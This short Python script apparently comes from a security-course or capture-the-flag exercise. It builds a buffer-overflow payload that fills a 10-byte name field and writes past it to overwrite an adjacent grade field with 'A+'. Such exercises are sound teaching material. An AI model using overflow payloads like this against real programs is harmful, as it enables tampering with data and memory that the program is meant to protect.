#!/usr/bin/env python3

import sys

#First 10 bytes is for name[10]
payload = b"Temmy"  #5 bytes for my name
payload += b"\x00"  #1 byte null terminator
payload += b"AAAA"  #4 bytes - padding to reach the 10 bytes for name 

#Next 4 bytes is overflow into Grade[]
payload += b"A+\x00" #3 bytes for grade "A+" and null terminator

sys.stdout.buffer.write(payload)